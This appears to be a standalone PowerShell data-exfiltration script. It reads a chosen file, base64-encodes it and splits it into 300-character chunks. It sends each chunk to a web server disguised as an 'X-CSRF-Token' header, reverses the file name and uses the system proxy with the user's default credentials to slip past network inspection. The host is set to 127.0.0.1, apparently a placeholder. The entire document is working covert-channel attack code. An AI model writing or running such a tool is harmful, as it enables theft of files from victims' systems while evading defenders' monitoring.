$filename = $args[0] 
$url = "127.0.0.1"

if (!$filename) { $filename = Read-Host -Prompt 'Enter your filename (including extension if exists)' }

$finalData =[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename))
$proxy = [System.Net.WebRequest]::GetSystemWebproxy()
$proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials


$finalData = $finalData -split '(\S{300})' | ? {$_}
$split_count = ([regex]::Matches($finalData, "(\S{300})" )).count

echo "File splitted by $split_count times"

$emanelif = -join $filename[-1..-$filename.Length]

Invoke-WebRequest -Uri $url"/menu.php?w="$split_count
Invoke-WebRequest -Uri $url"/menu.php?query="$emanelif

foreach ($num in $finalData) {
Get-Random -Count 1 -InputObject (97..122) | % -begin {$randomchar=$null} -process {$randomchar += [char]$_}  
$Response = Invoke-WebRequest -Uri $url -Headers @{"X-CSRF-Token"="$num"}
 }
